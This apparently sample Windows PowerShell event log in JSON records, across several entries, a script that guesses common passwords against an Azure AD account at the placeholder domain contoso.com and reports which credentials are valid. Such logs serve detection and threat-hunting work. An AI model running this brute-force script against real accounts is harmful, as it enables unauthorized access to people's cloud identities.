{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-24 13:23:56.5557084"},"EventRecordID":"1151","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Registry, Started, \tProviderName=Registry\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=1\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=e3d936a0-542a-4b37-9178-1405a1ff34b6\r\n\tHostApplication=powershell.exe &amp; {Import-Module -Name AzureAD\r\n\r\n$passwords = \"Password1`n1q2w3e4r`nPassword!\".split(\"{`n}\")\r\nforeach($password in $passwords) {\r\n $PWord = ConvertTo-SecureString -String \"$password\" -AsPlainText -Force\r\n $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"bruce.wayne@contoso.com\", $Pword\r\n try {\r\n Write-Host \" [-] Attempting ${password} on account bruce.wayne@contoso.com.\"\r\n Connect-AzureAD -Credential $Credential 2&gt;&amp;1&gt; $null\r\n # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success\r\n Write-Host \" [!] bruce.wayne@contoso.com:${password} are valid credentials!`r`n\"\r\n break\r\n } catch {\r\n Write-Host \" [-] bruce.wayne@contoso.com:${password} invalid credentials.`r`n\"\r\n }\r\n}\r\nWrite-Host \"End of bruteforce\"}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-24 13:23:56.6107646"},"EventRecordID":"1152","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Alias, Started, \tProviderName=Alias\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=3\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=e3d936a0-542a-4b37-9178-1405a1ff34b6\r\n\tHostApplication=powershell.exe &amp; {Import-Module -Name AzureAD\r\n\r\n$passwords = \"Password1`n1q2w3e4r`nPassword!\".split(\"{`n}\")\r\nforeach($password in $passwords) {\r\n $PWord = ConvertTo-SecureString -String \"$password\" -AsPlainText -Force\r\n $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"bruce.wayne@contoso.com\", $Pword\r\n try {\r\n Write-Host \" [-] Attempting ${password} on account bruce.wayne@contoso.com.\"\r\n Connect-AzureAD -Credential $Credential 2&gt;&amp;1&gt; $null\r\n # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success\r\n Write-Host \" [!] bruce.wayne@contoso.com:${password} are valid credentials!`r`n\"\r\n break\r\n } catch {\r\n Write-Host \" [-] bruce.wayne@contoso.com:${password} invalid credentials.`r`n\"\r\n }\r\n}\r\nWrite-Host \"End of bruteforce\"}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-24 13:23:56.6107646"},"EventRecordID":"1153","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Environment, Started, \tProviderName=Environment\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=5\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=e3d936a0-542a-4b37-9178-1405a1ff34b6\r\n\tHostApplication=powershell.exe &amp; {Import-Module -Name AzureAD\r\n\r\n$passwords = \"Password1`n1q2w3e4r`nPassword!\".split(\"{`n}\")\r\nforeach($password in $passwords) {\r\n $PWord = ConvertTo-SecureString -String \"$password\" -AsPlainText -Force\r\n $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"bruce.wayne@contoso.com\", $Pword\r\n try {\r\n Write-Host \" [-] Attempting ${password} on account bruce.wayne@contoso.com.\"\r\n Connect-AzureAD -Credential $Credential 2&gt;&amp;1&gt; $null\r\n # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success\r\n Write-Host \" [!] bruce.wayne@contoso.com:${password} are valid credentials!`r`n\"\r\n break\r\n } catch {\r\n Write-Host \" [-] bruce.wayne@contoso.com:${password} invalid credentials.`r`n\"\r\n }\r\n}\r\nWrite-Host \"End of bruteforce\"}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-24 13:23:56.6107646"},"EventRecordID":"1154","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"FileSystem, Started, \tProviderName=FileSystem\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=7\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=e3d936a0-542a-4b37-9178-1405a1ff34b6\r\n\tHostApplication=powershell.exe &amp; {Import-Module -Name AzureAD\r\n\r\n$passwords = \"Password1`n1q2w3e4r`nPassword!\".split(\"{`n}\")\r\nforeach($password in $passwords) {\r\n $PWord = ConvertTo-SecureString -String \"$password\" -AsPlainText -Force\r\n $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"bruce.wayne@contoso.com\", $Pword\r\n try {\r\n Write-Host \" [-] Attempting ${password} on account bruce.wayne@contoso.com.\"\r\n Connect-AzureAD -Credential $Credential 2&gt;&amp;1&gt; $null\r\n # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success\r\n Write-Host \" [!] bruce.wayne@contoso.com:${password} are valid credentials!`r`n\"\r\n break\r\n } catch {\r\n Write-Host \" [-] bruce.wayne@contoso.com:${password} invalid credentials.`r`n\"\r\n }\r\n}\r\nWrite-Host \"End of bruteforce\"}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-24 13:23:56.6107646"},"EventRecordID":"1155","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Function, Started, \tProviderName=Function\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=9\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=e3d936a0-542a-4b37-9178-1405a1ff34b6\r\n\tHostApplication=powershell.exe &amp; {Import-Module -Name AzureAD\r\n\r\n$passwords = \"Password1`n1q2w3e4r`nPassword!\".split(\"{`n}\")\r\nforeach($password in $passwords) {\r\n $PWord = ConvertTo-SecureString -String \"$password\" -AsPlainText -Force\r\n $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"bruce.wayne@contoso.com\", $Pword\r\n try {\r\n Write-Host \" [-] Attempting ${password} on account bruce.wayne@contoso.com.\"\r\n Connect-AzureAD -Credential $Credential 2&gt;&amp;1&gt; $null\r\n # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success\r\n Write-Host \" [!] bruce.wayne@contoso.com:${password} are valid credentials!`r`n\"\r\n break\r\n } catch {\r\n Write-Host \" [-] bruce.wayne@contoso.com:${password} invalid credentials.`r`n\"\r\n }\r\n}\r\nWrite-Host \"End of bruteforce\"}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-24 13:23:56.6107646"},"EventRecordID":"1156","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Variable, Started, \tProviderName=Variable\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=11\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=e3d936a0-542a-4b37-9178-1405a1ff34b6\r\n\tHostApplication=powershell.exe &amp; {Import-Module -Name AzureAD\r\n\r\n$passwords = \"Password1`n1q2w3e4r`nPassword!\".split(\"{`n}\")\r\nforeach($password in $passwords) {\r\n $PWord = ConvertTo-SecureString -String \"$password\" -AsPlainText -Force\r\n $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"bruce.wayne@contoso.com\", $Pword\r\n try {\r\n Write-Host \" [-] Attempting ${password} on account bruce.wayne@contoso.com.\"\r\n Connect-AzureAD -Credential $Credential 2&gt;&amp;1&gt; $null\r\n # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success\r\n Write-Host \" [!] bruce.wayne@contoso.com:${password} are valid credentials!`r`n\"\r\n break\r\n } catch {\r\n Write-Host \" [-] bruce.wayne@contoso.com:${password} invalid credentials.`r`n\"\r\n }\r\n}\r\nWrite-Host \"End of bruteforce\"}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"400"},"Version":"0","Level":"4","Task":"4","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-24 13:23:56.8145178"},"EventRecordID":"1157","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Available, None, \tNewEngineState=Available\r\n\tPreviousEngineState=None\r\n\r\n\tSequenceNumber=13\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=e3d936a0-542a-4b37-9178-1405a1ff34b6\r\n\tHostApplication=powershell.exe &amp; {Import-Module -Name AzureAD\r\n\r\n$passwords = \"Password1`n1q2w3e4r`nPassword!\".split(\"{`n}\")\r\nforeach($password in $passwords) {\r\n $PWord = ConvertTo-SecureString -String \"$password\" -AsPlainText -Force\r\n $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"bruce.wayne@contoso.com\", $Pword\r\n try {\r\n Write-Host \" [-] Attempting ${password} on account bruce.wayne@contoso.com.\"\r\n Connect-AzureAD -Credential $Credential 2&gt;&amp;1&gt; $null\r\n # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success\r\n Write-Host \" [!] bruce.wayne@contoso.com:${password} are valid credentials!`r`n\"\r\n break\r\n } catch {\r\n Write-Host \" [-] bruce.wayne@contoso.com:${password} invalid credentials.`r`n\"\r\n }\r\n}\r\nWrite-Host \"End of bruteforce\"}\r\n\tEngineVersion=5.1.19041.5007\r\n\tRunspaceId=61809703-882e-4131-9bbb-57de4cfbe2d9\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-24 13:23:57.8467299"},"EventRecordID":"1158","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Certificate, Started, \tProviderName=Certificate\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=15\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=e3d936a0-542a-4b37-9178-1405a1ff34b6\r\n\tHostApplication=powershell.exe &amp; {Import-Module -Name AzureAD\r\n\r\n$passwords = \"Password1`n1q2w3e4r`nPassword!\".split(\"{`n}\")\r\nforeach($password in $passwords) {\r\n $PWord = ConvertTo-SecureString -String \"$password\" -AsPlainText -Force\r\n $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"bruce.wayne@contoso.com\", $Pword\r\n try {\r\n Write-Host \" [-] Attempting ${password} on account bruce.wayne@contoso.com.\"\r\n Connect-AzureAD -Credential $Credential 2&gt;&amp;1&gt; $null\r\n # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success\r\n Write-Host \" [!] bruce.wayne@contoso.com:${password} are valid credentials!`r`n\"\r\n break\r\n } catch {\r\n Write-Host \" [-] bruce.wayne@contoso.com:${password} invalid credentials.`r`n\"\r\n }\r\n}\r\nWrite-Host \"End of bruteforce\"}\r\n\tEngineVersion=5.1.19041.5007\r\n\tRunspaceId=61809703-882e-4131-9bbb-57de4cfbe2d9\r\n\tPipelineId=2\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"403"},"Version":"0","Level":"4","Task":"4","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-24 13:23:58.0611969"},"EventRecordID":"1159","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Stopped, Available, \tNewEngineState=Stopped\r\n\tPreviousEngineState=Available\r\n\r\n\tSequenceNumber=17\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=e3d936a0-542a-4b37-9178-1405a1ff34b6\r\n\tHostApplication=powershell.exe &amp; {Import-Module -Name AzureAD\r\n\r\n$passwords = \"Password1`n1q2w3e4r`nPassword!\".split(\"{`n}\")\r\nforeach($password in $passwords) {\r\n $PWord = ConvertTo-SecureString -String \"$password\" -AsPlainText -Force\r\n $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"bruce.wayne@contoso.com\", $Pword\r\n try {\r\n Write-Host \" [-] Attempting ${password} on account bruce.wayne@contoso.com.\"\r\n Connect-AzureAD -Credential $Credential 2&gt;&amp;1&gt; $null\r\n # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success\r\n Write-Host \" [!] bruce.wayne@contoso.com:${password} are valid credentials!`r`n\"\r\n break\r\n } catch {\r\n Write-Host \" [-] bruce.wayne@contoso.com:${password} invalid credentials.`r`n\"\r\n }\r\n}\r\nWrite-Host \"End of bruteforce\"}\r\n\tEngineVersion=5.1.19041.5007\r\n\tRunspaceId=61809703-882e-4131-9bbb-57de4cfbe2d9\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"403"},"Version":"0","Level":"4","Task":"4","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-24 13:24:11.9590042"},"EventRecordID":"1160","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Stopped, Available, \tNewEngineState=Stopped\r\n\tPreviousEngineState=Available\r\n\r\n\tSequenceNumber=15\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=2acb7395-f206-4085-94eb-005e778087d0\r\n\tHostApplication=powershell.exe -ExecutionPolicy Restricted -Command $Res = 0; $Infs = Get-Item -Path ($env:WinDir + '\\inf\\*.inf'); foreach ($Inf in $Infs) { $Data = Get-Content $Inf.FullName; if ($Data -match '\\[defaultinstall.nt(amd64|arm|arm64|x86)\\]') { $Res = 1; break; } } Write-Host 'Final result:', $Res;\r\n\tEngineVersion=5.1.19041.5007\r\n\tRunspaceId=463c77c1-8b1d-4d6a-adbf-60a69f767024\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
